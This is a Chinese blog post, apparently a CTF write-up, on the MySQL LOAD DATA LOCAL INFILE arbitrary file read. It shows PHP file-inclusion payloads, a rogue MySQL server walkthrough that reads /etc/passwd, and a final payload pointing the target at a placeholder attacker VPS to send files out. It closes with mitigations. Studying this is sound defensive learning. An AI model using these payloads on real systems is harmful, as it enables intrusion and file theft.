@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="原文首发于安全客https://www.anquanke.com/post/id/173039 题目分析题目给出了源码 12345678910&amp;lt;?phpdefine(ROBOTS, 0);error_reporting(0);if(empty($_GET[&amp;quot;action&amp;quot;])) &amp;#123;    show_source(__FILE__);&amp;#125; else &amp;#1">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从一道ctf题学习mysql任意文件读取漏洞">
+<meta property="og:url" content="https://yyhylh.github.io/2019/03/18/从一道ctf题学习mysql任意文件读取漏洞/index.html">
+<meta property="og:site_name" content="LLLH">
+<meta property="og:description" content="原文首发于安全客https://www.anquanke.com/post/id/173039 题目分析题目给出了源码 12345678910&amp;lt;?phpdefine(ROBOTS, 0);error_reporting(0);if(empty($_GET[&amp;quot;action&amp;quot;])) &amp;#123;    show_source(__FILE__);&amp;#125; else &amp;#1">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACMhxx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACQjk4.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/AClVtH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACllB8.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACUuge.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACUlDA.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACU0Ds.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACUoUx.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACsJ10.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACsT3t.md.png">
+<meta property="og:updated_time" content="2019-03-18T02:03:47.405Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从一道ctf题学习mysql任意文件读取漏洞">
+<meta name="twitter:description" content="原文首发于安全客https://www.anquanke.com/post/id/173039 题目分析题目给出了源码 12345678910&amp;lt;?phpdefine(ROBOTS, 0);error_reporting(0);if(empty($_GET[&amp;quot;action&amp;quot;])) &amp;#123;    show_source(__FILE__);&amp;#125; else &amp;#1">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/03/11/ACMhxx.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yyhylh.github.io/2019/03/18/从一道ctf题学习mysql任意文件读取漏洞/"/>
+
+
+
+
+
+  <title>从一道ctf题学习mysql任意文件读取漏洞 | LLLH</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LLLH</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">恰逢适会</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yyhylh.github.io/2019/03/18/从一道ctf题学习mysql任意文件读取漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LH">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LLLH">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从一道ctf题学习mysql任意文件读取漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-18T10:01:55+08:00">
+                2019-03-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>原文首发于安全客<a href="https://www.anquanke.com/post/id/173039" target="_blank" rel="external">https://www.anquanke.com/post/id/173039</a></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目给出了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">define(ROBOTS, 0);</div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line">if(empty($_GET[&quot;action&quot;])) &#123;</div><div class="line">    show_source(__FILE__);</div><div class="line">&#125; else &#123;</div><div class="line">    include $_GET[&quot;action&quot;].&quot;.php&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以文件包含，但是被添加了<code>.php</code>后缀。尝试%00截断、超长字符串截断均不成功。<br>注意到第一句代码，变量名为ROBOTS,联想到robots.txt。<br>访问后发现目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">User-agent:*</div><div class="line"></div><div class="line">Disallow:/install</div><div class="line">Disallow:/admin</div></pre></td></tr></table></figure>
+<p>分别用php伪协议包含admin/index和install/index，payload为</p>
+<blockquote>
+<p><a href="http://ctf.chaffee.cc:23333/?action=php://filter/read=convert.base64-encode/resource=admin/index" target="_blank" rel="external">http://ctf.chaffee.cc:23333/?action=php://filter/read=convert.base64-encode/resource=admin/index</a><br><a href="http://ctf.chaffee.cc:23333/?action=php://filter/read=convert.base64-encode/resource=install/index" target="_blank" rel="external">http://ctf.chaffee.cc:23333/?action=php://filter/read=convert.base64-encode/resource=install/index</a></p>
+</blockquote>
+<p>得到admin/index.php，得到了flag的路径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line"></div><div class="line">if (!defined(&quot;ROBOTS&quot;)) &#123;die(&quot;Access Denied&quot;);&#125;</div><div class="line"></div><div class="line"></div><div class="line">echo &quot;Congratulate hack to here, But flag in /var/www/flag.flag&quot;;</div></pre></td></tr></table></figure></p>
+<p>install/index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line"></div><div class="line">if(file_exists(&quot;./install.lock&quot;)) &#123;</div><div class="line">    die(&quot;Have installed!&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">$host = $_REQUEST[&apos;host&apos;];</div><div class="line">$user = $_REQUEST[&apos;user&apos;];</div><div class="line">$passwd = $_REQUEST[&apos;passwd&apos;];</div><div class="line">$database = $_REQUEST[&apos;database&apos;];</div><div class="line"></div><div class="line"></div><div class="line">if(!empty($host) &amp;&amp; !empty($user) &amp;&amp; !empty($passwd) &amp;&amp; !empty($database)) &#123;</div><div class="line">    $conn = new mysqli($host, $user, $passwd);</div><div class="line">    if($conn-&gt;connect_error) &#123;</div><div class="line">        die($conn-&gt;connect_error);</div><div class="line">    &#125; else &#123;</div><div class="line">        $conn-&gt;query(&quot;DROP DATABASE &quot;.$database);</div><div class="line">        $conn-&gt;query(&quot;CREATE DATABASE &quot;.$database);</div><div class="line">        //To be continued</div><div class="line">        mysqli_close($conn);</div><div class="line"></div><div class="line"></div><div class="line">        $config = &quot;&lt;?php\n\$config=&quot;;</div><div class="line">        $config .= var_export(array(&quot;host&quot;=&gt;$host, &quot;user&quot;=&gt;$user, &quot;passwd&quot;=&gt;$passwd), TRUE).&quot;;&quot;;</div><div class="line">        file_put_contents(md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/config.php&quot;, $config);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>该文件首先判断当前目录有无install.lock，我们通过上一级目录的文件包含漏洞可以绕过这个判断。下面是接受用户输入登陆mysql数据库，登陆成功的话会执行两个没有任何过滤的SQL语句，然后执行一个文件写入的操作。<br>我在做这道题时第一反应是爆破数据库，进入下面的else语句里，写入代码到config.php执行，但是发现如果直接输入对应的参数，即<code>host=localhost&amp;user=root&amp;passwd=root&amp;database=era</code>,这样会报<code>No such file or directory</code>的错误。分析原因，的确成功登入数据库，但是在执行<code>file_put_contents()</code>函数时，插入了一个文件夹<code>md5($_SERVER[&quot;REMOTE_ADDR&quot;])</code>，而这个函数在文件夹不存在的情况下是不能新建文件夹的，因此这个<code>file_put_contents()</code>函数并不能利用，我觉得这像是出题人的一个陷阱。那真正的利用点在哪呢？</p>
+<h2 id="漏洞回顾"><a href="#漏洞回顾" class="headerlink" title="漏洞回顾"></a>漏洞回顾</h2><p>首先回顾一下去年爆出的<a href="http://aq.mk/index.php/archives/23/" target="_blank" rel="external">phpmyadmin任意文件读取漏洞</a>。<br>如果phpmyadmin开启了如下选项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$cfg[&apos;AllowArbitraryServer&apos;] = true; //false改为true</div></pre></td></tr></table></figure>
+<p>则登录时就可以访问远程的服务器。当登陆一个恶意构造的Mysql服务器时，即可利用<code>load data infile</code>读取该服务器上的任意文件。当然前提条件是<code>secure_file_priv</code>参数允许的目录下，且phpmyadmin的用户对该文件有读的权限。</p>
+<p>这里利用<a href="https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/" target="_blank" rel="external">vulnspy</a>上的实验环境演示分析该漏洞。</p>
+<p>首先是配置恶意服务器。在db服务器的命令行里修改root/exp/rogue_mysql_server.py文件，设port为3306外的其他端口，我这里设为3307，然后在filelist中选择一个要读取的文件。</p>
+<p><img src="https://s2.ax1x.com/2019/03/11/ACMhxx.png" alt="ACMhxx.png"></p>
+<p>运行这个python脚本，可以看到服务器已经开始监听这个端口</p>
+<p><a href="https://imgchr.com/i/ACQjk4" target="_blank" rel="external"><img src="https://s2.ax1x.com/2019/03/11/ACQjk4.md.png" alt="ACQjk4.md.png"></a></p>
+<p>访问phpMyAdmin的登录页面，地址输入db:3307、用户名vulnspy、密码vulnspy，提交登录。</p>
+<p><img src="https://s2.ax1x.com/2019/03/11/AClVtH.png" alt="AClVtH.png"></p>
+<p>在db的命令行里可以看到，文件访问已经成功。</p>
+<p><a href="https://imgchr.com/i/ACllB8" target="_blank" rel="external"><img src="https://s2.ax1x.com/2019/03/11/ACllB8.md.png" alt="ACllB8.md.png"></a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出在<code>Load data infile</code>语法。在mysql客户端登陆mysql服务端后，客户端执行语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Load data local infile &apos;/etc/passwd&apos; into table proc;</div></pre></td></tr></table></figure></p>
+<p>这里使用的是<code>load data local infile</code>，不加local是读取服务器的文件，添加local参数为读取本地文件。</p>
+<p><a href="https://imgchr.com/i/ACUuge" target="_blank" rel="external"><img src="https://s2.ax1x.com/2019/03/11/ACUuge.md.png" alt="ACUuge.md.png"></a></p>
+<p>即意为客户端本地的<code>/etc/passwd</code>文件插入了服务器的test表中。<br>服务器此时会回复一个包含了<code>/etc/passwd</code>的<code>Response TABULAR</code>包。</p>
+<p><a href="https://imgchr.com/i/ACUlDA" target="_blank" rel="external"><img src="https://s2.ax1x.com/2019/03/11/ACUlDA.md.png" alt="ACUlDA.md.png"></a></p>
+<p><a href="https://imgchr.com/i/ACU0Ds" target="_blank" rel="external"><img src="https://s2.ax1x.com/2019/03/11/ACU0Ds.md.png" alt="ACU0Ds.md.png"></a></p>
+<p>接着客户端就回复给服务端本地<code>/etc/passwd</code>中的内容。<br><a href="https://imgchr.com/i/ACUoUx" target="_blank" rel="external"><img src="https://s2.ax1x.com/2019/03/11/ACUoUx.md.png" alt="ACUoUx.md.png"></a></p>
+<p>正常的请求逻辑如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sequenceDiagram</div><div class="line">客户端-&gt;&gt;服务端: Load data infile &apos;/etc/passwd&apos;... </div><div class="line">服务端-&gt;&gt;客户端: Response TABULAR</div><div class="line">客户端-&gt;&gt;服务端: Content in /etc/passwd</div></pre></td></tr></table></figure>
+<p>这是正常的情况，即客户端发送一个<code>load data infile</code> 请求，服务器回复一个<code>Response TABULAR</code>，不会出现什么问题。<br>但是Mysql允许服务端在任何时候发送<code>Response TABULAR</code>数据包， 此时就跳过了第一步，实现了任意文件读取的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sequenceDiagram</div><div class="line">客户端-&gt;&gt;服务端: </div><div class="line">服务端-&gt;&gt;客户端: Response TABULAR</div><div class="line">客户端-&gt;&gt;服务端: Content in /etc/passwd</div></pre></td></tr></table></figure>
+<p>恶意mysql服务器只需要完成mysql连接的握手包，然后发送出这个<code>Response TABULAR</code>包，即可收到客户端传来的文件。</p>
+<p>在刚才的phpmyadmin实例里抓包，可以看到该恶意服务端发包和客户端发送数据的包内容。</p>
+<p><a href="https://imgchr.com/i/ACsJ10" target="_blank" rel="external"><img src="https://s2.ax1x.com/2019/03/11/ACsJ10.md.png" alt="ACsJ10.md.png"></a></p>
+<p>这里给出github上的<a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py" target="_blank" rel="external">恶意mysql服务器地址</a>。</p>
+<p>这就是整个漏洞的分析过程，最后回到开始那道ctf题，答案也是显而易见了。在vps上开启一个恶意mysql服务器并监听。然后在浏览器输入payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">host=VPS_ADDR:EVIL-MYSQL_PORT&amp;user=root&amp;passwd=root&amp;database=ddd</div></pre></td></tr></table></figure></p>
+<p>即可在服务器的mysql.log里看到flag<br><a href="https://imgchr.com/i/ACsT3t" target="_blank" rel="external"><img src="https://s2.ax1x.com/2019/03/11/ACsT3t.md.png" alt="ACsT3t.md.png"></a></p>
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ul>
+<li>关闭<code>local_infile</code>参数，禁止导入本地文件</li>
+<li>开启<code>--ssl-mode=VERIFY_IDENTITY</code>参数，防止连接不安全的mysql服务器。</li>
+</ul>
+<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul>
+<li><a href="https://lightless.me/archives/read-mysql-client-file.html#_label5" target="_blank" rel="external">https://lightless.me/archives/read-mysql-client-file.html#_label5</a></li>
+<li><a href="https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html</a></li>
+<li><a href="https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/" target="_blank" rel="external">https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/25/WinRAR漏洞复现/" rel="next" title="WinRAR漏洞复现">
+                <i class="fa fa-chevron-left"></i> WinRAR漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="LH" />
+            
+              <p class="site-author-name" itemprop="name">LH</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞回顾"><span class="nav-number">2.</span> <span class="nav-text">漏洞回顾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞防御"><span class="nav-number">4.</span> <span class="nav-text">漏洞防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文档"><span class="nav-number">5.</span> <span class="nav-text">参考文档</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LH</span>
+
+  
+</div>
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+  </body>
+</html>
